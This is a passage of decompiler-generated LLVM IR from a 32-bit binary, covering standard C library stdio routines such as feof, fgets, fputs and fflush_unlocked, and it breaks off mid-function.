  uselistorder i32 %v0_8050eaf, { 1, 2, 0 }
  uselistorder i32 %v0_8050e75, { 1, 0 }
  uselistorder i32 %v1_8050e67, { 1, 0 }
  uselistorder i32 %v1_8050e62, { 0, 1, 3, 2 }
  uselistorder i32 %v6_8050e60, { 2, 0, 1 }
  uselistorder i32 %v0_8050e82, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8050e1d, { 1, 2, 0 }
  uselistorder i32 %v0_8050df5, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_8050de8.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_8050de1.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_8050deb, { 1, 2, 0 }
  uselistorder i32 %v6_8050de9, { 0, 2, 1 }
  uselistorder i32 %v1_8050de8, { 0, 2, 3, 1 }
  uselistorder i32 %v3_8050de1, { 2, 1, 0 }
  uselistorder i32 %v1_8050dd9, { 1, 0 }
  uselistorder i32 %v1_8050de1137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_8050dd1, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_8050dc4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_8050dbf, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8050d95, { 0, 2, 1 }
  uselistorder i32 %v2_8050d84, { 1, 0 }
  uselistorder i32 %v0_8050d82, { 2, 0, 1 }
  uselistorder i32 %v4_8050d1c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 42, 30, 29, 31, 32, 34, 33, 44, 43, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 4, 0, 1, 2, 3 }
  uselistorder i32 -134610155, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_805fcf5.715 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80510d7, { 1, 0 }
  uselistorder label %dec_label_pc_80510d4, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_80510c8, { 1, 0 }
  uselistorder label %dec_label_pc_805109d, { 1, 0 }
  uselistorder label %dec_label_pc_8051062, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805100e, { 1, 0 }
  uselistorder label %dec_label_pc_8050fe2, { 1, 0 }
  uselistorder label %dec_label_pc_8050f4a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050f17, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050eee, { 1, 0 }
  uselistorder label %dec_label_pc_8050ec5, { 1, 0 }
  uselistorder label %dec_label_pc_8050e8c, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8050e2f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050de8, { 1, 0 }
  uselistorder label %dec_label_pc_8050dd9, { 1, 0 }
  uselistorder label %dec_label_pc_8050dcf, { 1, 0 }
  uselistorder label %dec_label_pc_8050db8, { 1, 0 }
  uselistorder label %dec_label_pc_8050db8.outer, { 2, 0, 1 }
}

define i32 @feof(i32* %arg1) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v12_80510e3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp5, i32* %esi.global-to-local, align 4
  %v1_80510ea = add i32 %tmp5, 52
  %v2_80510ea = inttoptr i32 %v1_80510ea to i32*
  %v3_80510ea = load i32, i32* %v2_80510ea, align 4
  %v1_80510ed = icmp eq i32 %v3_80510ea, 0
  %v1_80510ef = icmp eq i1 %v1_80510ed, false
  br i1 %v1_80510ef, label %dec_label_pc_8051110.thread, label %dec_label_pc_8051116

dec_label_pc_8051110.thread:                      ; preds = %entry
  %v2_805111016 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_8051127

dec_label_pc_8051116:                             ; preds = %entry
  %v1_80510f1 = add i32 %tmp5, 56
  store i32 %v12_80510e3, i32* @eax, align 4
  %v2_8051100 = call i32 @__pthread_return_void(i32 %v12_80510e3, i32 134560279)
  %v1_8051108 = call i32 @__pthread_return_0(i32 %v1_80510f1)
  %v0_8051110.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8051110 = inttoptr i32 %v0_8051110.pre to i32*
  %v2_8051110 = load i32, i32* %v1_8051110, align 4
  store i32 %v12_80510e3, i32* @eax, align 4
  %v2_805111f = call i32 @__pthread_return_void(i32 %v12_80510e3, i32 1)
  br label %dec_label_pc_8051127

dec_label_pc_8051127:                             ; preds = %dec_label_pc_8051110.thread, %dec_label_pc_8051116
  %v0_8051127 = phi i32 [ %v2_8051110, %dec_label_pc_8051116 ], [ %v2_805111016, %dec_label_pc_8051110.thread ]
  %v1_805112c = and i32 %v0_8051127, 4
  ret i32 %v1_805112c

; uselistorder directives
  uselistorder i32 %v12_80510e3, { 2, 3, 0, 1 }
  uselistorder i32 %tmp5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051127, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8051134 = load i32, i32* @edi, align 4
  %v0_8051135 = load i32, i32* @esi, align 4
  %v0_8051136 = load i32, i32* @ebx, align 4
  %v12_8051137 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_805113e = add i32 %arg3, 52
  %v2_805113e = inttoptr i32 %v1_805113e to i32*
  %v3_805113e = load i32, i32* %v2_805113e, align 4
  store i32 %v3_805113e, i32* @edi, align 4
  %v1_8051141 = icmp eq i32 %v3_805113e, 0
  %v1_8051143 = icmp eq i1 %v1_8051141, false
  br i1 %v1_8051143, label %entry.dec_label_pc_8051164_crit_edge, label %dec_label_pc_8051145

entry.dec_label_pc_8051164_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8051164

dec_label_pc_8051145:                             ; preds = %entry
  %v1_8051145 = add i32 %arg3, 56
  store i32 %v1_8051145, i32* @ebx, align 4
  store i32 %v12_8051137, i32* @eax, align 4
  %v2_8051154 = call i32 @__pthread_return_void(i32 %v12_8051137, i32 134560279)
  %v0_8051159 = load i32, i32* @ebx, align 4
  %v1_805115c = call i32 @__pthread_return_0(i32 %v0_8051159)
  %v0_8051165.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051164

dec_label_pc_8051164:                             ; preds = %entry.dec_label_pc_8051164_crit_edge, %dec_label_pc_8051145
  %v0_8051165 = phi i32 [ %arg3, %entry.dec_label_pc_8051164_crit_edge ], [ %v0_8051165.pre, %dec_label_pc_8051145 ]
  %v0_8051164 = load i32, i32* @edx, align 4
  %v4_805116e = inttoptr i32 %arg1 to i8*
  %v5_805116e = call i32 @__GI_fgets_unlocked(i8* %v4_805116e, i32 %arg2, i32 %v0_8051165, i32 %v0_8051164)
  store i32 %v5_805116e, i32* %ebx.global-to-local, align 4
  br i1 %v1_8051143, label %dec_label_pc_805118d, label %dec_label_pc_805117c

dec_label_pc_805117c:                             ; preds = %dec_label_pc_8051164
  store i32 %v12_8051137, i32* @eax, align 4
  %v2_8051185 = call i32 @__pthread_return_void(i32 %v12_8051137, i32 1)
  %v0_8051190.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805118d

dec_label_pc_805118d:                             ; preds = %dec_label_pc_8051164, %dec_label_pc_805117c
  %v0_8051190 = phi i32 [ %v5_805116e, %dec_label_pc_8051164 ], [ %v0_8051190.pre, %dec_label_pc_805117c ]
  store i32 %v0_8051136, i32* @ebx, align 4
  store i32 %v0_8051135, i32* @esi, align 4
  store i32 %v0_8051134, i32* @edi, align 4
  ret i32 %v0_8051190

; uselistorder directives
  uselistorder i32 %v12_8051137, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805118d, { 1, 0 }
  uselistorder label %dec_label_pc_8051164, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8051198 = load i32, i32* @edi, align 4
  %v0_8051199 = load i32, i32* @esi, align 4
  %v0_805119a = load i32, i32* @ebx, align 4
  %v12_805119b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_80511a2 = add i32 %arg2, 52
  %v2_80511a2 = inttoptr i32 %v1_80511a2 to i32*
  %v3_80511a2 = load i32, i32* %v2_80511a2, align 4
  store i32 %v3_80511a2, i32* @edi, align 4
  %v1_80511a5 = icmp eq i32 %v3_80511a2, 0
  %v1_80511a7 = icmp eq i1 %v1_80511a5, false
  br i1 %v1_80511a7, label %entry.dec_label_pc_80511c8_crit_edge, label %dec_label_pc_80511a9

entry.dec_label_pc_80511c8_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80511c8

dec_label_pc_80511a9:                             ; preds = %entry
  %v1_80511a9 = add i32 %arg2, 56
  store i32 %v1_80511a9, i32* @ebx, align 4
  store i32 %v12_805119b, i32* @eax, align 4
  %v2_80511b8 = call i32 @__pthread_return_void(i32 %v12_805119b, i32 134560279)
  %v0_80511bd = load i32, i32* @ebx, align 4
  %v1_80511c0 = call i32 @__pthread_return_0(i32 %v0_80511bd)
  %v0_80511ca.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80511c8

dec_label_pc_80511c8:                             ; preds = %entry.dec_label_pc_80511c8_crit_edge, %dec_label_pc_80511a9
  %v0_80511ca = phi i32 [ %arg2, %entry.dec_label_pc_80511c8_crit_edge ], [ %v0_80511ca.pre, %dec_label_pc_80511a9 ]
  %v0_80511c8 = load i32, i32* @edx, align 4
  %v4_80511cf = inttoptr i32 %arg1 to i8*
  %v5_80511cf = call i32 @__GI_fputs_unlocked(i8* %v4_80511cf, i32 %v0_80511ca, i32 %v0_80511c8, i32 %v0_80511c8)
  store i32 %v5_80511cf, i32* %ebx.global-to-local, align 4
  br i1 %v1_80511a7, label %dec_label_pc_80511ee, label %dec_label_pc_80511dd

dec_label_pc_80511dd:                             ; preds = %dec_label_pc_80511c8
  store i32 %v12_805119b, i32* @eax, align 4
  %v2_80511e6 = call i32 @__pthread_return_void(i32 %v12_805119b, i32 1)
  %v0_80511f1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80511ee

dec_label_pc_80511ee:                             ; preds = %dec_label_pc_80511c8, %dec_label_pc_80511dd
  %v0_80511f1 = phi i32 [ %v5_80511cf, %dec_label_pc_80511c8 ], [ %v0_80511f1.pre, %dec_label_pc_80511dd ]
  store i32 %v0_805119a, i32* @ebx, align 4
  store i32 %v0_8051199, i32* @esi, align 4
  store i32 %v0_8051198, i32* @edi, align 4
  ret i32 %v0_80511f1

; uselistorder directives
  uselistorder i32 %v12_805119b, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80511ee, { 1, 0 }
  uselistorder label %dec_label_pc_80511c8, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_8051207 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051207, i32* @eax, align 4
  %v2_805120c = call i32 @__pthread_return_void(i32 %v2_8051207, i32 134560279)
  %v1_8051218 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061308.701 to i32))
  %v0_805121d = load i32, i32* @global_var_80655a4.702, align 4
  %v8_8051225 = icmp eq i32 %v0_805121d, 1
  %v1_8051226 = icmp eq i1 %v8_8051225, false
  br i1 %v1_8051226, label %dec_label_pc_80512bd, label %dec_label_pc_805122c

dec_label_pc_805122c:                             ; preds = %entry
  %v0_805122c = load i32, i32* @global_var_80655a8.703, align 8
  %tmp29 = icmp slt i32 %v0_805122c, 1
  br i1 %tmp29, label %dec_label_pc_80512bd, label %dec_label_pc_8051239

dec_label_pc_8051239:                             ; preds = %dec_label_pc_805122c
  store i32 0, i32* @esi, align 4
  %v2_8051246 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_8051246, i32* @eax, align 4
  %v2_805124b = call i32 @__pthread_return_void(i32 %v2_8051246, i32 134560279)
  %v1_8051257 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80612f0.705 to i32))
  %v0_805125c = load i32, i32* bitcast (i32** @global_var_80612ec.706 to i32*), align 4
  store i32 %v0_805125c, i32* %edx.global-to-local, align 4
  %v1_805129e3 = icmp eq i32 %v0_805125c, 0
  %v1_80512a010 = icmp eq i1 %v1_805129e3, false
  br i1 %v1_80512a010, label %dec_label_pc_8051267, label %dec_label_pc_80512a2

dec_label_pc_8051267:                             ; preds = %dec_label_pc_8051239, %dec_label_pc_805129c
  %v0_8051277 = phi i32 [ %v0_805129c, %dec_label_pc_805129c ], [ %v0_805125c, %dec_label_pc_8051239 ]
  %v1_805126713 = inttoptr i32 %v0_8051277 to i16*
  %v2_8051267 = load i16, i16* %v1_805126713, align 2
  %v1_805126f = add i32 %v0_8051277, 32
  %v2_805126f = inttoptr i32 %v1_805126f to i32*
  %v3_805126f = load i32, i32* %v2_805126f, align 4
  store i32 %v3_805126f, i32* @ebx, align 4
  %v1_805126a = and i16 %v2_8051267, -32720
  %v6_8051272 = icmp eq i16 %v1_805126a, 48
  br i1 %v6_8051272, label %dec_label_pc_805127b, label %dec_label_pc_8051277

dec_label_pc_8051277:                             ; preds = %dec_label_pc_8051267
  store i32 %v0_8051277, i32* @esi, align 4
  br label %dec_label_pc_805129c

dec_label_pc_805127b:                             ; preds = %dec_label_pc_8051267
  %v0_805127b = load i32, i32* @esi, align 4
  %v1_805127b = icmp eq i32 %v0_805127b, 0
  %v1_805127d = icmp eq i1 %v1_805127b, false
  br i1 %v1_805127d, label %dec_label_pc_8051287, label %dec_label_pc_805127f

dec_label_pc_805127f:                             ; preds = %dec_label_pc_805127b
  store i32 %v3_805126f, i32* bitcast (i32** @global_var_80612ec.706 to i32*), align 4
  br label %dec_label_pc_805128a

dec_label_pc_8051287:                             ; preds = %dec_label_pc_805127b
  %v2_8051287 = add i32 %v0_805127b, 32
  %v3_8051287 = inttoptr i32 %v2_8051287 to i32*
  store i32 %v3_805126f, i32* %v3_8051287, align 4
  %v0_805128a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805128a

dec_label_pc_805128a:                             ; preds = %dec_label_pc_805127f, %dec_label_pc_8051287
  %v0_8051293 = phi i32 [ %v0_8051277, %dec_label_pc_805127f ], [ %v0_805128a.pre, %dec_label_pc_8051287 ]
  %v1_805128a = add i32 %v0_8051293, 1
  %v2_805128a = inttoptr i32 %v1_805128a to i8*
  %v3_805128a = load i8, i8* %v2_805128a, align 1
  %v4_805128a = and i8 %v3_805128a, 32
  %v5_805128a = icmp eq i8 %v4_805128a, 0
  br i1 %v5_805128a, label %dec_label_pc_805129c, label %dec_label_pc_8051290

dec_label_pc_8051290:                             ; preds = %dec_label_pc_805128a
  %v1_8051294 = call i32 @free(i32 %v0_8051293)
  br label %dec_label_pc_805129c

dec_label_pc_805129c:                             ; preds = %dec_label_pc_805128a, %dec_label_pc_8051277, %dec_label_pc_8051290
  %v0_805129c = load i32, i32* @ebx, align 4
  store i32 %v0_805129c, i32* %edx.global-to-local, align 4
  %v1_805129e = icmp eq i32 %v0_805129c, 0
  %v1_80512a0 = icmp eq i1 %v1_805129e, false
  br i1 %v1_80512a0, label %dec_label_pc_8051267, label %dec_label_pc_80512a2

dec_label_pc_80512a2:                             ; preds = %dec_label_pc_805129c, %dec_label_pc_8051239
  store i32 %v2_8051246, i32* @eax, align 4
  %v2_80512ab = call i32 @__pthread_return_void(i32 %v2_8051246, i32 1)
  store i32 0, i32* @global_var_80655a8.703, align 8
  %v0_80512bd.pre = load i32, i32* @global_var_80655a4.702, align 4
  br label %dec_label_pc_80512bd

dec_label_pc_80512bd:                             ; preds = %dec_label_pc_805122c, %entry, %dec_label_pc_80512a2
  %v0_80512bd = phi i32 [ %v0_805121d, %dec_label_pc_805122c ], [ %v0_805121d, %entry ], [ %v0_80512bd.pre, %dec_label_pc_80512a2 ]
  %v1_80512c2 = add i32 %v0_80512bd, -1
  store i32 %v1_80512c2, i32* @global_var_80655a4.702, align 4
  store i32 %v2_8051207, i32* @eax, align 4
  %v2_80512d1 = call i32 @__pthread_return_void(i32 %v2_8051207, i32 1)
  ret i32 %v2_80512d1

; uselistorder directives
  uselistorder i32 %v0_805129c, { 1, 2, 0 }
  uselistorder i32 %v0_8051277, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805121d, { 1, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80512bd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805129c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805128a, { 1, 0 }
  uselistorder label %dec_label_pc_8051267, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_80512dc = load i32, i32* @ebp, align 4
  %v0_80512dd = load i32, i32* @edi, align 4
  %v0_80512de = load i32, i32* @esi, align 4
  %v0_80512df = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_80512e5 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80512e5, i32* @ebx, align 4
  %v10_80512e9 = icmp eq i16* %arg1, inttoptr (i32 134615788 to i16*)
  br i1 %v10_80512e9, label %dec_label_pc_80512fe, label %dec_label_pc_80512f1

dec_label_pc_80512f1:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_80512f6 = icmp eq i16* %arg1, null
  %v1_80512f8 = icmp eq i1 %v2_80512f6, false
  br i1 %v1_80512f8, label %dec_label_pc_80513ed, label %dec_label_pc_80512fe

dec_label_pc_80512fe:                             ; preds = %dec_label_pc_80512f1, %entry
  store i32 0, i32* @edi, align 4
  %v2_805130b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805130b, i32* @ebx, align 4
  %v2_8051310 = call i32 @__pthread_return_void(i32 %v2_805130b, i32 134560279)
  %v1_805131c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061308.701 to i32))
  store i32 ptrtoint (i32* @global_var_8061308.701 to i32), i32* @ecx, align 4
  %v0_8051322 = load i32, i32* @global_var_80655a4.702, align 4
  %v1_8051328 = add i32 %v0_8051322, 1
  store i32 %v1_8051328, i32* @eax, align 4
  store i32 %v1_8051328, i32* @global_var_80655a4.702, align 4
  %v2_8051331 = call i32 @__pthread_return_void(i32 %v2_805130b, i32 1)
  store i32 %v2_8051331, i32* @eax, align 4
  %v2_8051344 = call i32 @__pthread_return_void(i32 %v2_805130b, i32 134560279)
  %v1_8051350 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80612f0.705 to i32))
  store i32 ptrtoint (i32* @global_var_80612f0.705 to i32), i32* @eax, align 4
  %v0_8051359 = load i32, i32* bitcast (i32** @global_var_80612ec.706 to i32*), align 4
  store i32 %v0_8051359, i32* @esi, align 4
  %v2_8051360 = call i32 @__pthread_return_void(i32 %v2_805130b, i32 1)
  %v0_80513e21 = load i32, i32* @esi, align 4
  %v1_80513e22 = icmp eq i32 %v0_80513e21, 0
  %v1_80513e49 = icmp eq i1 %v1_80513e22, false
  br i1 %v1_80513e49, label %dec_label_pc_805136a, label %dec_label_pc_80513e6

dec_label_pc_805136a:                             ; preds = %dec_label_pc_80512fe, %dec_label_pc_80513df
  %v0_8051378 = phi i32 [ %v3_80513df, %dec_label_pc_80513df ], [ %v0_80513e21, %dec_label_pc_80512fe ]
  %v1_805136a = inttoptr i32 %v0_8051378 to i8*
  %v2_805136a = load i8, i8* %v1_805136a, align 1
  %v3_805136a = and i8 %v2_805136a, 64
  %v4_805136a = icmp eq i8 %v3_805136a, 0
  br i1 %v4_805136a, label %dec_label_pc_80513df, label %dec_label_pc_805136f

dec_label_pc_805136f:                             ; preds = %dec_label_pc_805136a
  %v0_805136f = load i32, i32* @global_var_8061320.704, align 32
  %v9_805136f = icmp eq i32 %v0_805136f, 2
  br i1 %v9_805136f, label %dec_label_pc_8051397, label %dec_label_pc_8051378

dec_label_pc_8051378:                             ; preds = %dec_label_pc_805136f
  %v1_8051378 = add i32 %v0_8051378, 56
  store i32 %v1_8051378, i32* @ebx, align 4
  store i32 %v2_805130b, i32* @eax, align 4
  %v2_8051387 = call i32 @__pthread_return_void(i32 %v2_805130b, i32 134560279)
  %v0_805138c = load i32, i32* @ebx, align 4
  %v1_805138f = call i32 @__pthread_return_0(i32 %v0_805138c)
  %v1_8051399.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051397

dec_label_pc_8051397:                             ; preds = %dec_label_pc_805136f, %dec_label_pc_8051378
  %v0_80513a9 = phi i32 [ %v0_8051378, %dec_label_pc_805136f ], [ %v1_8051399.pre, %dec_label_pc_8051378 ]
  %v0_8051397 = load i32, i32* @ebp, align 4
  %v2_8051399 = inttoptr i32 %v0_80513a9 to i32*
  %v3_8051399 = load i32, i32* %v2_8051399, align 4
  %v4_8051399 = or i32 %v3_8051399, %v0_8051397
  %v2_805139b = urem i32 %v4_8051399, 65536
  %v9_805139b = and i32 %v2_805139b, 832
  %v2_805139f = icmp eq i32 %v9_805139b, 320
  %v1_80513a4 = icmp eq i1 %v2_805139f, false
  br i1 %v1_80513a4, label %dec_label_pc_80513c5, label %dec_label_pc_80513a6

dec_label_pc_80513a6:                             ; preds = %dec_label_pc_8051397
  %v1_80513aa = call i32 @__stdio_wcommit(i32 %v0_80513a9)
  %v1_80513b2 = icmp eq i32 %v1_80513aa, 0
  br i1 %v1_80513b2, label %dec_label_pc_80513bb, label %dec_label_pc_80513b6

dec_label_pc_80513b6:                             ; preds = %dec_label_pc_80513a6
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_80513c5

dec_label_pc_80513bb:                             ; preds = %dec_label_pc_80513a6
  %v0_80513bb = load i32, i32* @esi, align 4
  %v1_80513bb = inttoptr i32 %v0_80513bb to i16*
  %v2_80513bb = load i16, i16* %v1_80513bb, align 2
  %v3_80513bb = and i16 %v2_80513bb, -65
  store i16 %v3_80513bb, i16* %v1_80513bb, align 2
  %v0_80513bf = load i32, i32* @esi, align 4
  %v1_80513bf = add i32 %v0_80513bf, 8
  %v2_80513bf = inttoptr i32 %v1_80513bf to i32*
  %v3_80513bf = load i32, i32* %v2_80513bf, align 4
  %v2_80513c2 = add i32 %v0_80513bf, 28
  %v3_80513c2 = inttoptr i32 %v2_80513c2 to i32*
  store i32 %v3_80513bf, i32* %v3_80513c2, align 4
  br label %dec_label_pc_80513c5

dec_label_pc_80513c5:                             ; preds = %dec_label_pc_8051397, %dec_label_pc_80513b6, %dec_label_pc_80513bb
  %v0_80513c5 = load i32, i32* @global_var_8061320.704, align 32
  %v9_80513c5 = icmp eq i32 %v0_80513c5, 2
  br i1 %v9_80513c5, label %dec_label_pc_80513df, label %dec_label_pc_80513ce

dec_label_pc_80513ce:                             ; preds = %dec_label_pc_80513c5
  store i32 %v2_805130b, i32* @eax, align 4
  %v2_80513d7 = call i32 @__pthread_return_void(i32 %v2_805130b, i32 1)
  br label %dec_label_pc_80513df

dec_label_pc_80513df:                             ; preds = %dec_label_pc_80513c5, %dec_label_pc_805136a, %dec_label_pc_80513ce
  %v0_80513df = load i32, i32* @esi, align 4
  %v1_80513df = add i32 %v0_80513df, 32
  %v2_80513df = inttoptr i32 %v1_80513df to i32*
  %v3_80513df = load i32, i32* %v2_80513df, align 4
  store i32 %v3_80513df, i32* @esi, align 4
  %v1_80513e2 = icmp eq i32 %v3_80513df, 0
  %v1_80513e4 = icmp eq i1 %v1_80513e2, false
  br i1 %v1_80513e4, label %dec_label_pc_805136a, label %dec_label_pc_80513e6

dec_label_pc_80513e6:                             ; preds = %dec_label_pc_80513df, %dec_label_pc_80512fe
  %v0_80513e6 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_8051413

dec_label_pc_80513ed:                             ; preds = %dec_label_pc_80512f1
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_80513ef = load i8, i8* %tmp23, align 1
  %v4_80513ef = and i8 %v3_80513ef, 64
  %v5_80513ef = icmp eq i8 %v4_80513ef, 0
  br i1 %v5_80513ef, label %dec_label_pc_8051413, label %dec_label_pc_80513f4

dec_label_pc_80513f4:                             ; preds = %dec_label_pc_80513ed
  store i32 -1, i32* @edi, align 4
  %v1_80513fb = call i32 @__stdio_wcommit(i32 %v4_80512e5)
  %v1_8051403 = icmp eq i32 %v1_80513fb, 0
  %v1_8051405 = icmp eq i1 %v1_8051403, false
  br i1 %v1_8051405, label %dec_label_pc_8051413, label %dec_label_pc_8051407

dec_label_pc_8051407:                             ; preds = %dec_label_pc_80513f4
  %v3_8051407 = load i16, i16* %arg1, align 2
  %v4_8051407 = and i16 %v3_8051407, -65
  store i16 %v4_8051407, i16* %arg1, align 2
  %v2_805140b = add i32 %v4_80512e5, 8
  %v3_805140b = inttoptr i32 %v2_805140b to i32*
  %v4_805140b = load i32, i32* %v3_805140b, align 4
  %v3_805140e = add i32 %v4_80512e5, 28
  %v4_805140e = inttoptr i32 %v3_805140e to i32*
  store i32 %v4_805140b, i32* %v4_805140e, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8051413

dec_label_pc_8051413:                             ; preds = %dec_label_pc_80513f4, %dec_label_pc_80513ed, %dec_label_pc_80513e6, %dec_label_pc_8051407
  %v0_8051416 = load i32, i32* @edi, align 4
  store i32 %v0_80512df, i32* @ebx, align 4
  store i32 %v0_80512de, i32* @esi, align 4
  store i32 %v0_80512dd, i32* @edi, align 4
  store i32 %v0_80512dc, i32* @ebp, align 4
  ret i32 %v0_8051416

; uselistorder directives
  uselistorder i32 %v3_80513df, { 1, 2, 0 }
  uselistorder i32 %v2_805130b, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_80612ec.706 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_80655a4.702, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8061308.701 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_8051413, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80513df, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80513c5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051397, { 1, 0 }
  uselistorder label %dec_label_pc_805136a, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8051420 = load i32, i32* @ebp, align 4
  %v4_8051427 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051427, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_8051427, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_8051471.preheader, label %dec_label_pc_805147d

dec_label_pc_8051471.preheader:                   ; preds = %entry
  %v1_805147119 = add i32 %arg2, -1
  %v8_805147120 = icmp eq i32 %v1_805147119, 0
  store i32 %v1_805147119, i32* @esi, align 4
  %v1_805147221 = icmp eq i1 %v8_805147120, false
  br i1 %v1_805147221, label %dec_label_pc_805143b, label %dec_label_pc_8051474

dec_label_pc_805143b:                             ; preds = %dec_label_pc_8051471.preheader, %dec_label_pc_805146f.dec_label_pc_8051471_crit_edge.dec_label_pc_805143b_crit_edge
  %v0_805143b = phi i32 [ %v0_805143b.pre, %dec_label_pc_805146f.dec_label_pc_8051471_crit_edge.dec_label_pc_805143b_crit_edge ], [ %arg3, %dec_label_pc_8051471.preheader ]
  %v1_805143b = add i32 %v0_805143b, 16
  %v2_805143b = inttoptr i32 %v1_805143b to i32*
  %v3_805143b = load i32, i32* %v2_805143b, align 4
  store i32 %v3_805143b, i32* %eax.global-to-local, align 4
  %v2_805143e = add i32 %v0_805143b, 24
  %v3_805143e = inttoptr i32 %v2_805143e to i32*
  %v4_805143e = load i32, i32* %v3_805143e, align 4
  %v10_805143e = icmp ult i32 %v3_805143b, %v4_805143e
